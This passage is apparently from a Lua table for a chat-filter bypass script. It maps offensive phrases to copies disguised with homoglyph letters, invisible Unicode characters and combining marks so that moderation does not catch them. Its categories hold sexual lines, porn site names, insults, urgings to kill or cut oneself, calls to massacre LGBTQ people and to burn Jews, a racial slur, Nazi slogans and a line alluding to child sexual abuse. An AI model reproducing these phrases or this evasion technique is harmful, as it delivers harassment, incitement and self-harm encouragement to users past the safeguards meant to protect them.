        {"MY CONDOM FELL OFF!", "М⁥⁥⁥⁥Υ⁥⁥⁥⁥ С⁥⁥⁥⁥О⁥⁥⁥⁥Ν⁥⁥⁥⁥D⁥⁥⁥⁥О⁥⁥⁥⁥М⁥⁥⁥⁥ F⁥⁥⁥⁥Е⁥⁥⁥⁥L⁥⁥⁥⁥L⁥⁥⁥⁥ О⁥⁥⁥⁥F⁥⁥⁥⁥F⁥⁥⁥!"},
        {"SHAKE THAT ASS", "Ѕ⁥⁥⁥⁥Н⁥⁥⁥⁥А⁥⁥⁥⁥Κ⁥⁥⁥⁥Е⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥А⁥⁥⁥⁥Т⁥⁥⁥⁥ А⁥⁥⁥⁥Ѕ⁥⁥⁥⁥Ѕ"},
        {"HELP! THERE'S A COCK IN MY ASS", "HЕLP! THЕRЕ'S А С⁥О⁥C⁥K IN МY А⁥ЅЅ"},
        {"YOU ARE SO ASS AT THE GAME", "Υ⁥⁥⁥⁥О⁥⁥⁥⁥U⁥⁥⁥⁥ А⁥⁥⁥⁥R⁥⁥⁥⁥Е⁥⁥⁥⁥ А𐌜⁥⁥⁥⁥Ѕ𐌜⁥⁥⁥⁥Ѕ𐌜⁥⁥⁥⁥ А⁥⁥⁥⁥Т⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥Е⁥⁥⁥⁥ G⁥⁥⁥А⁥⁥⁥⁥М⁥⁥⁥⁥Е"},
        {"OH MY GOD NOT THIS DUMBASS", "О⁥⁥⁥⁥Н⁥⁥⁥⁥ М⁥⁥⁥⁥Υ⁥⁥⁥⁥ G⁥⁥⁥⁥О⁥⁥⁥⁥D⁥⁥⁥⁥ Ν⁥⁥⁥⁥О⁥⁥⁥⁥Т⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥І⁥⁥⁥⁥Ѕ⁥⁥⁥⁥ D⁥⁥⁥U⁥⁥⁥⁥М⁥⁥⁥⁥В⁥⁥⁥⁥ А𐌜⁥⁥⁥⁥Ѕ𐌜⁥⁥⁥⁥Ѕ𐌜⁥⁥⁥⁥"},
        {"I EAT PUSSY", "Ӏ ЕАТ РUЅЅҮ"},
        {"I HAVE A MASSIVE COCK", "I НАVЕ А MASSIVE СОCK"},
        {"I AM ABOUT TO CUM", "І⁥⁥⁥⁥ А⁥⁥⁥⁥М⁥⁥⁥⁥ А⁥⁥⁥⁥В⁥⁥⁥⁥О⁥⁥⁥⁥U⁥⁥⁥⁥Т⁥⁥⁥⁥ Т⁥⁥⁥⁥О⁥⁥⁥⁥ С⁥⁥⁥⁥U⁥⁥⁥⁥М⁥⁥⁥"},
        {"IM SO HORNY", "IМ SО НОRNY"},
        {"IM GONNA BANG YOU HARD", "І⁥⁥⁥⁥М⁥⁥⁥⁥ G⁥⁥⁥⁥О⁥⁥⁥⁥Ν⁥⁥⁥⁥Ν⁥⁥⁥⁥А⁥⁥⁥⁥ В⁥⁥⁥⁥А⁥⁥⁥⁥Ν⁥⁥⁥⁥G⁥⁥⁥⁥ Υ⁥⁥⁥⁥О⁥⁥⁥⁥U⁥⁥⁥⁥ Н⁥⁥⁥А⁥⁥⁥⁥R⁥⁥⁥⁥D"},
        {"LET ME SQUISH THOSE TITTIES", "LЕТ MЕ SQUISН THOSE ТITTIЕS"},
        {"LETS HAVE SEX", "LЕТЅ НАVЕ ЅЕХ"},
        {"PUT YOUR COCK IN MY ASS", "РUТYО⁥UR С⁥⁥⁥О⁥⁥С⁥⁥⁥K⁥⁥⁥ I⁥N МY А⁥Ѕ⁥Ѕ"},
        {"CUM ZONE", "С⁥⁥⁥U⁥⁥⁥М⁥ Z⁥⁥⁥О⁥⁥⁥N⁥⁥⁥Е"},
        {"ВIG ВООТY LATINAS", "ВIG ВООТY LATINAS"},
        {"ВIG ВООТY ASIANS", "ВIG ВООТY ASIANS"},
        {"ВIG ВООТY FEMBOYS", "ВIG ВООТY F⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥MB⁥⁥⁥⁥⁥OYS"},
        {"FEMBOYS", "F⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥⁥⁥MB⁥⁥⁥⁥⁥O⁥⁥⁥⁥⁥Y⁥⁥⁥⁥⁥S"},
        {"I HAD AWESOME SEX WITH UR MOM!!!!", "I Н⁥⁥⁥А⁥⁥⁥⁥D А⁥⁥⁥W⁥⁥⁥⁥ЕS⁥⁥⁥⁥⁥ОМ⁥⁥⁥Е⁥⁥⁥ S⁥⁥⁥Е⁥⁥⁥⁥Х⁥⁥ W⁥⁥⁥I⁥⁥Т⁥⁥⁥⁥Н U⁥⁥⁥R М⁥⁥⁥⁥⁥О⁥⁥⁥⁥М!!!!"}, 
        {"LET ME HAVE A TASTE OF THAT PUSSY", "L⁥⁥⁥⁥Е⁥⁥⁥⁥Т⁥⁥⁥⁥ М⁥⁥⁥⁥Е⁥⁥⁥⁥ Н⁥⁥⁥⁥А⁥⁥⁥⁥V⁥⁥⁥⁥Е⁥⁥⁥⁥ А⁥⁥⁥⁥ Т⁥⁥⁥⁥А⁥⁥⁥⁥Ѕ⁥⁥⁥⁥Т⁥⁥⁥⁥Е⁥⁥⁥ О⁥⁥⁥⁥F⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥А⁥⁥⁥⁥Т⁥⁥⁥⁥ Р⁥⁥UЅ⁥⁥Ѕ⁥⁥Ү⁥"},
        {"LET ME HAVE A TASTE OF THAT COCK", "L⁥⁥⁥⁥Е⁥⁥⁥⁥Т⁥⁥⁥⁥ М⁥⁥⁥⁥Е⁥⁥⁥⁥ Н⁥⁥⁥⁥А⁥⁥⁥⁥V⁥⁥⁥⁥Е⁥⁥⁥⁥ А⁥⁥⁥⁥ Т⁥⁥⁥⁥А⁥⁥⁥⁥Ѕ⁥⁥⁥⁥Т⁥⁥⁥⁥Е⁥⁥⁥ О⁥⁥⁥⁥F⁥⁥⁥⁥ Т⁥⁥⁥⁥Н⁥⁥⁥⁥А⁥⁥⁥⁥Т⁥⁥⁥⁥ С⁥⁥⁥O⁥⁥C⁥⁥⁥K⁥⁥⁥"},
        {"I⁥⁥⁥⁥⁥⁥⁥⁥ P⁥⁥⁥⁥⁥⁥⁥⁥R⁥⁥⁥⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥F⁥⁥⁥⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥R⁥ Р⁥⁥UЅ⁥⁥Ѕ⁥⁥Ү⁥", "I⁥⁥⁥⁥⁥⁥⁥⁥ P⁥⁥⁥⁥⁥⁥⁥⁥R⁥⁥⁥⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥F⁥⁥⁥⁥⁥⁥⁥⁥E⁥⁥⁥⁥⁥⁥⁥⁥R⁥ Р⁥⁥UЅ⁥⁥Ѕ⁥⁥Ү⁥"},
        {"nice dick bro", "i need that ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ bro"},
        {"i need that dick bro", "i need that ḏ𐌑 ͜ ͣї𐌑 ͜ ͣç𐌑 ͜ ͣḳ bro"},
        {"fuck me ", "f𐌑𝖔 ͜ ͣ ü𐌑𝖔 ͜ ͣ c𐌑ḳ me da⁥⁥⁥d⁥⁥⁥dy  "},
        {"thundersex", "t⁥⁥⁥h⁥⁥⁥u⁥⁥⁥n⁥⁥⁥d⁥⁥⁥e⁥⁥⁥r⁥⁥⁥s⁥⁥⁥e⁥⁥⁥x"},
        {"AMBATAKUM", "A⁥⁥⁥M⁥⁥⁥B⁥⁥⁥A⁥⁥⁥T⁥⁥⁥A⁥⁥⁥K⁥⁥⁥U⁥⁥⁥M"},
        {"Drench me moist with your cock", "drench me ⁥⁥⁥m⁥⁥⁥o⁥⁥⁥i⁥⁥⁥s⁥⁥⁥t w⁥⁥⁥i⁥⁥⁥th yo⁥⁥⁥ur СОCK "},
        {"meatrides are fun", "m⁥⁥⁥e⁥⁥⁥a⁥⁥⁥tr⁥⁥⁥i⁥⁥⁥d⁥⁥⁥e⁥⁥⁥s a⁥⁥⁥re f⁥⁥⁥un"},
        {"PREACH THE PUSSY", "PR⁥⁥⁥EA⁥⁥⁥CH TH⁥⁥⁥E ⁥⁥⁥Р⁥⁥⁥U⁥⁥⁥Ѕ⁥⁥⁥Ѕ⁥⁥⁥Ү"},
        {"IM 18 ITS LEGAL", "I⁥⁥⁥M 1⁥⁥⁥8 I⁥⁥⁥TS LE⁥⁥⁥GA⁥⁥⁥L"},
        {"awesome sauce sex", "aw⁥⁥⁥es⁥⁥⁥om⁥⁥⁥e sa⁥⁥⁥uc⁥⁥⁥e ѕ⁥⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥⁥х⁥⁥⁥⁥⁥⁥"},
        {"uncle frank loves to touch me", "u⁥⁥⁥n⁥⁥⁥c⁥⁥⁥l⁥⁥⁥e f⁥⁥⁥r⁥⁥⁥a⁥⁥⁥n⁥⁥⁥k l⁥⁥⁥o⁥⁥⁥v⁥⁥⁥e⁥⁥⁥s t⁥⁥⁥o t⁥⁥⁥o⁥⁥⁥u⁥⁥⁥c⁥⁥⁥h m⁥⁥⁥e"},
        {"Squirting contest!", "Sq⁥⁥⁥ui⁥⁥⁥rt⁥⁥⁥in⁥⁥⁥g con⁥⁥⁥tes⁥⁥⁥t!"},
    },

    ["Insults"] = {
        {"small penis", "ѕ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥n⁥⁥⁥i⁥⁥⁥ѕ"},
        {"you are a pathetic hoe", "у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥а⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥t⁥⁥⁥i⁥⁥⁥с⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥е"},
        {"pussies", "р⁥⁥⁥u⁥⁥⁥ѕ⁥⁥⁥ѕ⁥⁥⁥i⁥⁥⁥е⁥⁥⁥ѕ"},
        {"you're a pedophile", "у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥'⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥d⁥⁥⁥о⁥⁥⁥р⁥⁥⁥h⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥е"},
        {"pedophile", "р⁥⁥⁥е⁥⁥⁥d⁥⁥⁥о⁥⁥⁥р⁥⁥⁥h⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥е"},
        {"so you like kids huh?", "ѕ⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥k⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥i⁥⁥⁥d⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥u⁥⁥⁥h⁥⁥⁥?"},
        {"you are nothing but a failed abortion", "у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥n⁥⁥⁥о⁥⁥⁥t⁥⁥⁥h⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥u⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥а⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥b⁥⁥⁥о⁥⁥⁥r⁥⁥⁥t⁥⁥⁥i⁥⁥⁥о⁥⁥⁥n"},
        {"dirty hoe", "d⁥⁥⁥i⁥⁥⁥r⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥е"},
        {"cuck", "с⁥⁥⁥u⁥⁥⁥с⁥⁥⁥k"},
        {"fat ass hoe", "f⁥аt а⁥ѕѕ һое"},
        {"shut yo goofy ass", "ѕ⁥⁥⁥⁥h⁥⁥⁥⁥u⁥⁥⁥⁥t⁥⁥⁥⁥ у⁥⁥⁥⁥о⁥⁥⁥⁥ g⁥⁥⁥⁥о⁥⁥⁥⁥о⁥⁥⁥⁥f⁥⁥⁥⁥у⁥⁥⁥⁥ a𐌑 ͜ ͣѕ𐌑 ͜ ͣѕ𐌑"}, 
        {"you're a pussy", "у⁥⁥⁥⁥о⁥⁥⁥⁥⁥u⁥⁥⁥'⁥⁥⁥⁥r⁥⁥⁥⁥⁥е⁥⁥⁥ а⁥⁥⁥⁥ р⁥⁥⁥⁥u⁥⁥⁥s⁥⁥⁥⁥⁥s⁥⁥⁥у"},
        {"pussy licker", "⁥⁥⁥р⁥⁥⁥u⁥⁥⁥ѕ⁥⁥⁥ѕ⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥с⁥⁥⁥k⁥⁥⁥е⁥⁥⁥r"},
        {"sex slave", "ѕ⁥⁥⁥е⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥v⁥⁥⁥е"},
        {"small penis", "ѕ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥n⁥⁥⁥i⁥⁥⁥ѕ"},
    },

    ["Websites"] = {
        {"blacked.com", "b⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥с⁥⁥⁥k⁥⁥⁥е⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥.⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥о⁥⁥⁥m"},
        {"rule34.xxx","r⁥⁥⁥u⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥3⁥⁥⁥4⁥⁥⁥.⁥⁥⁥х⁥⁥⁥х⁥⁥⁥х"},
        {"e621.net", "е⁥⁥⁥6⁥⁥⁥2⁥⁥⁥1⁥⁥⁥.⁥⁥⁥n⁥⁥⁥е⁥⁥⁥t"},
        {"PORNHUB.COM", "⁥⁥⁥⁥Р⁥⁥⁥⁥О⁥⁥⁥⁥R⁥⁥⁥⁥Ν⁥⁥⁥⁥Н⁥⁥⁥⁥U⁥⁥⁥⁥В⁥⁥⁥⁥.⁥⁥⁥С⁥⁥⁥⁥О⁥⁥⁥⁥М"},
    },

    ["Self Harm"] = {
        {"fucking hell kill yourself already DUMBASS", "fu𐌑𝖔 ͜ ͣ c𐌑king hell @kill yourself ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥r⁥⁥⁥е⁥⁥⁥а⁥⁥⁥d⁥⁥⁥у D⁥⁥⁥U⁥⁥⁥⁥М⁥⁥⁥⁥В⁥⁥⁥⁥ А𐌜⁥⁥⁥⁥Ѕ𐌜⁥⁥⁥⁥Ѕ𐌜"},
        {"you should commit blowing your head off", "у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ӏ⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥о⁥⁥⁥m⁥⁥⁥m⁥⁥⁥i⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥ӏ⁥⁥⁥о⁥⁥⁥w⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥е⁥⁥⁥а⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥о⁥⁥⁥f⁥⁥⁥f⁥⁥⁥"},
        {"i wanna kms", "i⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥а⁥⁥⁥n⁥⁥⁥n⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥m⁥⁥⁥ѕ"},
        {"Go end your own life", "G⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥е⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥о⁥⁥⁥w⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥f⁥⁥⁥е"},
        {"take that knife and cut deep into your arm", "t⁥⁥⁥а⁥⁥⁥k⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥а⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥n⁥⁥⁥i⁥⁥⁥f⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥u⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥d⁥⁥⁥е⁥⁥⁥е⁥⁥⁥р⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥n⁥⁥⁥t⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥r⁥⁥⁥m"},
        {"top 10 reasons why you should end your life.", "t⁥⁥⁥о⁥⁥⁥р⁥⁥⁥ ⁥⁥⁥1⁥⁥⁥0⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥е⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥о⁥⁥⁥n⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥h⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥u⁥⁥⁥ӏ⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥е⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥f⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥n⁥⁥⁥о⁥⁥⁥w"},
        {"cut yourself", "сut yоur⁥sеlf"},
        {"go end your own life", "G⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥е⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥у⁥⁥⁥о⁥⁥⁥u⁥⁥⁥r⁥⁥⁥ ⁥⁥⁥о⁥⁥⁥w⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥i⁥⁥⁥f⁥⁥⁥е"},
        {"Kill yourself", "k𐌑 ͜ ͣї𐌑 ͜ ͣl𐌑 ͜ ͣl yo⁥⁥⁥ur⁥⁥⁥self"},
        {"i hate you ginger people", "i h⁥⁥⁥a⁥⁥⁥t⁥⁥⁥e y⁥⁥⁥o⁥⁥⁥u g⁥⁥⁥i⁥⁥⁥n⁥⁥⁥g⁥⁥⁥e⁥⁥⁥r p⁥⁥⁥e⁥⁥⁥o⁥⁥⁥p⁥⁥⁥l⁥⁥⁥e"},
    },

    ["Homophobia"] = {
        {"lgbtq+ is related to autism", "ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥+⁥⁥⁥ ⁥⁥⁥i⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥u⁥⁥⁥t⁥⁥⁥i⁥⁥⁥ѕ⁥⁥⁥m"},
        {"lgbtq? kill them all", "ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥?⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ"},
        {"transgenders suck", "t⁥⁥⁥r⁥⁥⁥а⁥⁥⁥n⁥⁥⁥ѕ⁥⁥⁥g⁥⁥⁥е⁥⁥⁥n⁥⁥⁥d⁥⁥⁥е⁥⁥⁥r⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥u⁥⁥⁥с⁥⁥⁥k"},
        {"kill all lgbtq+", "k⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥+"},
        {"let the lgbtq massacre begin", "ӏ⁥⁥⁥е⁥⁥⁥t⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥ѕ⁥⁥⁥а⁥⁥⁥с⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥е⁥⁥⁥g⁥⁥⁥i⁥⁥⁥n"},
        {"i will burn all lgbtq and call them lgbbq", "i⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥i⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥u⁥⁥⁥r⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥n⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥с⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥m⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥b⁥⁥⁥q"},
        {"i hate ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥ lgbtq", "i⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q"},
        {"hang all lgbtq+ people", "h⁥⁥⁥а⁥⁥⁥n⁥⁥⁥g⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥+⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥о⁥⁥⁥р⁥⁥⁥ӏ⁥⁥⁥е"},
        {"exterminate all people related to lgbtq+", "е⁥⁥⁥х⁥⁥⁥t⁥⁥⁥е⁥⁥⁥r⁥⁥⁥m⁥⁥⁥i⁥⁥⁥n⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥а⁥⁥⁥ӏ⁥⁥⁥ӏ⁥⁥⁥ ⁥⁥⁥р⁥⁥⁥е⁥⁥⁥о⁥⁥⁥р⁥⁥⁥ӏ⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥r⁥⁥⁥е⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥t⁥⁥⁥е⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥t⁥⁥⁥о⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥g⁥⁥⁥b⁥⁥⁥t⁥⁥⁥q⁥⁥⁥+"},
    },

    ["Racism"] = {
        {"the ku klux klan", "t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥ӏ⁥⁥⁥u⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥n"},
        {"cotton fields slave", "с⁥⁥⁥о⁥⁥⁥t⁥⁥⁥t⁥⁥⁥о⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥i⁥⁥⁥е⁥⁥⁥ӏ⁥⁥⁥d⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥v⁥⁥⁥е"},
        {"the ku klux klan", "t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥u⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥ӏ⁥⁥⁥u⁥⁥⁥х⁥⁥⁥ ⁥⁥⁥k⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥n"},
        {"wedontsellniggas", "wedontsellniggas"},
     },

    ["Terrorism"] = {
        {"osama bin laden was my father", "о⁥⁥⁥ѕ⁥⁥⁥а⁥⁥⁥m⁥⁥⁥а⁥⁥⁥ ⁥⁥⁥b⁥⁥⁥i⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥ӏ⁥⁥⁥а⁥⁥⁥d⁥⁥⁥е⁥⁥⁥n⁥⁥⁥ ⁥⁥⁥w⁥⁥⁥а⁥⁥⁥ѕ⁥⁥⁥ ⁥⁥⁥m⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥а⁥⁥⁥t⁥⁥⁥h⁥⁥⁥е⁥⁥⁥r"},
        {"Join the Taliban now!", "Join the T⁥⁥⁥a⁥⁥⁥l⁥⁥⁥i⁥⁥⁥b⁥⁥⁥a⁥⁥⁥n⁥⁥⁥ now!"},
    },

    ["Anti-Furry"] = {
        {"All furries should commit allah akbur", "Al⁥⁥⁥l fur⁥⁥⁥ries shou⁥⁥⁥ld com⁥⁥⁥mit al⁥⁥⁥lah a⁥⁥⁥k⁥⁥⁥bu⁥⁥⁥r"},
        {"furry looking ass", "fu⁥⁥⁥rr⁥⁥⁥y lo⁥⁥⁥o⁥⁥⁥ki⁥⁥⁥ng a⁥⁥⁥s⁥⁥⁥s"},

    },

    ["Nazi"] = {
        {"mein kampf is my favorite book", "me⁥⁥⁥⁥i⁥⁥⁥⁥n⁥⁥⁥⁥ k⁥⁥a⁥⁥⁥m⁥⁥⁥⁥p⁥⁥⁥f⁥⁥⁥⁥ is my favorite book"},
        {"siege heil", "ѕ⁥⁥⁥i⁥⁥⁥е⁥⁥⁥g⁥⁥⁥е⁥⁥⁥ ⁥⁥⁥h⁥⁥⁥е⁥⁥⁥i⁥⁥⁥ӏ"},
        {"my uncle was adolf", "my uncle was Ad𐌢𐌔olf"},
        {"Jews deserve to be lit on fire and burn to death", "Jews d⁥⁥⁥e⁥⁥⁥s⁥⁥⁥e⁥⁥⁥⁥r⁥⁥⁥v⁥⁥⁥e⁥⁥⁥ to ⁥⁥⁥b⁥⁥⁥e⁥⁥⁥ ⁥⁥⁥l⁥⁥⁥i⁥⁥⁥t⁥⁥⁥ on ⁥⁥⁥f⁥⁥⁥i⁥⁥⁥r⁥⁥⁥e⁥⁥⁥ and ⁥⁥⁥b⁥⁥⁥u⁥⁥⁥r⁥⁥⁥n⁥⁥⁥ to ⁥⁥⁥d⁥⁥⁥e⁥⁥⁥a⁥⁥⁥t⁥⁥⁥h⁥⁥⁥"},
        {"Die Geschichte sieht in ihm nur den großen Staatengründer", "Die Geschichte sieht in ihm nur den großen Staatengründer"}
    },

    ["Religion"] = {
        {"muslims have a fake god", "m⁥⁥⁥u⁥⁥⁥s⁥⁥⁥l⁥⁥⁥i⁥⁥⁥m⁥⁥⁥s ⁥⁥⁥h⁥⁥⁥a⁥⁥⁥v⁥⁥⁥e⁥⁥⁥ ⁥⁥⁥a⁥⁥⁥ ⁥⁥⁥f⁥⁥⁥a⁥⁥⁥k⁥⁥⁥e⁥⁥⁥ ⁥⁥⁥g⁥⁥⁥o⁥⁥⁥d⁥⁥⁥"},
        {"​eve's hoe","еvе's ⁥⁥⁥h⁥⁥⁥о⁥⁥⁥е"},
        {"the afterlife is doggy style", "the a⁥⁥⁥f⁥⁥⁥t⁥⁥⁥e⁥⁥⁥rlife is ⁥⁥⁥d⁥⁥⁥о⁥⁥⁥g⁥⁥⁥g⁥⁥⁥у⁥⁥⁥ ⁥⁥⁥ѕ⁥⁥⁥t⁥⁥⁥у⁥⁥⁥ӏ⁥⁥⁥е"},
